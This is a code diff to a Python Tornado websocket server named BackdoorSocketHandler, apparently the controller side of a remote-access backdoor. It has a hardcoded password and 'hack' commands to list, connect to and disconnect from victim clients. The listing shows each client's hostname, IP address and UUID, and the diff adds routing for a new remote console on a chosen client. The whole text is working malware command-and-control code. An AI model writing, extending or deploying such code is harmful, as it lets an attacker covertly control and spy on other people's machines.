@@ -15,7 +15,7 @@ PASSWORD = '110110zxc'
 
 
 class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
-    clients = dict()
+    clients = {}
     ID_LASTEST = 0
 
     def data_received(self, chunk):
@@ -63,7 +63,7 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
         self.write_message(self.encrypt(json.dumps(jsonobj)))
 
     def on_message(self, message):
-        if self.UUID and self.SECRET:
+        if self.UUID is not None and self.SECRET is not None:
             # --Command--
             json_str = self.decrypt(message)
             msg = json.loads(json_str)
@@ -72,6 +72,13 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
                 command = b64decode(msg['cmd'])
                 print command
                 self.parse_command(command)
+
+            elif not self.is_controller and 'to' in msg:
+                to = msg['to']
+                if 'connected' in msg and to is not None:
+                    to_controler = self.clients[to]
+                    to_controler.to_client_id = self.ID
+                    to_controler.send_json({'connected': self.ID})
 
                 # pass
                 # '''
@@ -148,13 +155,14 @@ class BackdoorSocketHandler(tornado.websocket.WebSocketHandler):
   hack connect <client_id>
   hack (list|disconnect)
   hack (-h | --help)
-  hack new thread
+  hack new consloe
   hack --version
 
 Options:
   connect <client_id>   Connect to client.
   list                  List all online client.
   disconnect            Disconnect linked client.
+  new consloe           Strat a new consloe.
   -h --help             Show this.
   --version             Show version.
 """
@@ -164,12 +172,15 @@ Options:
             # ===== connect =====
             # ===================
             if args['connect']:
+                if self.to_client_id is not None:
+                    self.send_data('Diconnect first.\n')
+                    self.send_end()
+
                 to = int(args['<client_id>'])
                 if to in self.clients:
                     to_client = self.clients[to]
                     if not to_client.is_controller:
-                        self.to_client_id = int(args['<client_id>'])
-                        self.send_json({'connected': str(self.to_client_id)})
+                        to_client.send_json({'new_consloe': self.ID})
 
                     else:
                         self.send_data('You can not connect to a control-client.\n')
@@ -183,9 +194,9 @@ Options:
             # ==== disconnect ====
             # ====================
             elif args['disconnect']:
-                if self.to_client_id:
+                if self.to_client_id is not None:
                     self.to_client_id = None
-                    self.send_json({'disconnected': str(self.to_client_id)})
+                    self.send_json({'disconnected': self.to_client_id})
 
                 else:
                     self.send_data('You have not connected to any clients.\n')
@@ -199,8 +210,9 @@ Options:
                 for key, client in self.clients.items():
                     data += str(key) + '\t' + client.HOST_NAME + '\t' + \
                             client.request.remote_ip + '\t' + client.UUID + '\n'
-                    self.send_data(data)
-                    self.send_end()
+
+                self.send_data(data)
+                self.send_end()
 
         except SystemExit as e:
             self.send_data(e.message)
